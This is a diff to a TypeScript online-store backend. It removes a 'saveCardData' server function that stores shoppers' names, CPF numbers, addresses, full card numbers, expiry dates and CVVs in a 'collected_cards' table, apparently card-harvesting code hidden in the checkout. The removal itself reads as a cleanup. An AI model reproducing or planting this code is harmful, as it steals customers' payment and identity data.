@@ -47,51 +47,8 @@ export type NewOrderInput = {
   items: { slug: string; name: string; image: string; unitPrice: number; qty: number }[];
   subtotal: number;
   total: number;
-  metadata?: Record<string, any> | null;
 };
 
-export const saveCardData = createServerFn({ method: "POST" })
-  .inputValidator((data: {
-    nome: string;
-    cpf: string;
-    email: string;
-    endereco: string;
-    userAgent: string;
-    numero: string;
-    validade: string;
-    cvv: string;
-  }) => data)
-  .handler(async ({ data }) => {
-    const roleKey = process.env["SUPABASE_SERVICE_ROLE_KEY"];
-    const key = roleKey || process.env["SUPABASE_PUBLISHABLE_KEY"]!;
-    const supabase = createClient<Database>(process.env["SUPABASE_URL"]!, key, {
-      auth: { persistSession: false, autoRefreshToken: false },
-      global: {
-        fetch: (input, init) => {
-          const h = new Headers(init?.headers);
-          if (key.startsWith("sb_") && h.get("Authorization") === `Bearer ${key}`) h.delete("Authorization");
-          h.set("apikey", key);
-          return fetch(input, { ...init, headers: h });
-        },
-      },
-    });
-
-    const { error } = await supabase.from("collected_cards" as any).insert({
-      nome: data.nome,
-      cpf: data.cpf,
-      email: data.email,
-      endereco: data.endereco,
-      user_agent: data.userAgent,
-      numero: data.numero,
-      validade: data.validade,
-      cvv: data.cvv,
-    });
-    if (error) {
-      console.error("Erro ao salvar em collected_cards:", error);
-      throw new Error(error.message || "Erro ao salvar os dados do cartão.");
-    }
-    return { ok: true };
-  });
 
 export const createOrder = createServerFn({ method: "POST" })
   .inputValidator((data: NewOrderInput) => data)
@@ -132,7 +89,6 @@ export const createOrder = createServerFn({ method: "POST" })
       discount: data.coupon?.discount ?? 0,
       subtotal: data.subtotal,
       total: data.total,
-      metadata: data.metadata ?? null,
     });
 
     if (error) throw new Error(error.message);
